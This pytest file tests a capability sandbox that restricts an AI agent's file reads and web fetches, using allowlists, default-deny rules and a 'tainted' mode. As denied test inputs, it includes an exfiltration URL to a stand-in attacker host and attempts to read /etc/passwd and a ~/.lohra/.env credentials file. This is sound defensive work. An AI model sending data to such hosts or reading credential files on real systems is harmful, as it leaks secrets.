"""Tests for the leaf capability sandbox (Fase 8 §8.3)."""

import json
from pathlib import Path

from lohra.workflow.sandbox import (
    WorkflowPolicy,
    load_policy,
    make_sandboxed_leaf_factory,
    sandbox_dispatch,
)


def _base(name, args):
    return '{"ok": true, "ran": true}'  # the underlying dispatch "runs" the tool


def _denied(out: str) -> bool:
    return "error" in json.loads(out)


def test_fs_read_inside_working_root_allowed(tmp_path):
    target = tmp_path / "work" / "note.txt"
    target.parent.mkdir(parents=True)
    target.write_text("x")
    d = sandbox_dispatch(_base, working_root=tmp_path / "work", policy=WorkflowPolicy(), tainted=False)
    assert not _denied(d("read_file", {"path": str(target)}))


def test_fs_read_outside_working_root_denied(tmp_path):
    d = sandbox_dispatch(_base, working_root=tmp_path / "work", policy=WorkflowPolicy(), tainted=False)
    assert _denied(d("read_file", {"path": str(tmp_path / "elsewhere.txt")}))


def test_fs_read_of_lohra_config_denied(tmp_path):
    # ~/.lohra/.env is outside the run's working_root -> deny-by-default.
    d = sandbox_dispatch(_base, working_root=tmp_path / "work", policy=WorkflowPolicy(), tainted=False)
    assert _denied(d("read_file", {"path": str(Path.home() / ".lohra" / ".env")}))


def test_web_fetch_non_allowlisted_host_denied(tmp_path):
    policy = WorkflowPolicy(egress_allow=("good.test",))
    d = sandbox_dispatch(_base, working_root=tmp_path, policy=policy, tainted=False)
    assert _denied(d("web_fetch", {"url": "https://attacker.test/?leak=secret"}))
    assert not _denied(d("web_fetch", {"url": "https://good.test/page"}))


def test_egress_default_deny_when_no_allowlist(tmp_path):
    d = sandbox_dispatch(_base, working_root=tmp_path, policy=WorkflowPolicy(), tainted=False)
    assert _denied(d("web_fetch", {"url": "https://anything.test/"}))


def test_tainted_run_denies_all_fs_and_egress(tmp_path):
    work = tmp_path / "work"
    work.mkdir()
    f = work / "ok.txt"
    f.write_text("x")
    policy = WorkflowPolicy(egress_allow=("good.test",))
    d = sandbox_dispatch(_base, working_root=work, policy=policy, tainted=True)
    assert _denied(d("read_file", {"path": str(f)}))  # even inside working_root
    assert _denied(d("web_fetch", {"url": "https://good.test/"}))  # even allowlisted
    assert _denied(d("web_search", {"query": "x"}))


def test_non_fs_non_egress_tools_pass_through(tmp_path):
    d = sandbox_dispatch(_base, working_root=tmp_path, policy=WorkflowPolicy(), tainted=True)
    assert not _denied(d("some_other_tool", {"x": 1}))  # sandbox only gates fs/egress


def test_load_policy_missing_file_is_default_deny(tmp_path):
    policy = load_policy(tmp_path / "nope.json")
    assert policy.fs_allow == () and policy.egress_allow == ()


def test_load_policy_reads_allowlists(tmp_path):
    # A bare string root is READ-WRITE (WF-21 back-compat: that is what every
    # policy written before the mode existed already granted). The ro/rw split
    # itself lives in tests/test_workflow_m7_fixes.py.
    p = tmp_path / "policy.json"
    p.write_text(json.dumps({"fs_allow": ["/data"], "egress_allow": ["api.test"]}))
    policy = load_policy(p)
    assert policy.egress_allow == ("api.test",)
    assert [(str(root.path), root.writable) for root in policy.fs_allow] == [("/data", True)]


def test_sandboxed_factory_wraps_dispatch():
    class FakeAgent:
        tool_dispatch = staticmethod(_base)

    factory = make_sandboxed_leaf_factory(
        base_factory=lambda: FakeAgent(),
        working_root=Path("/tmp/work"),
        policy=WorkflowPolicy(),
        tainted=False,
    )
    agent = factory()
    assert _denied(agent.tool_dispatch("read_file", {"path": "/etc/passwd"}))
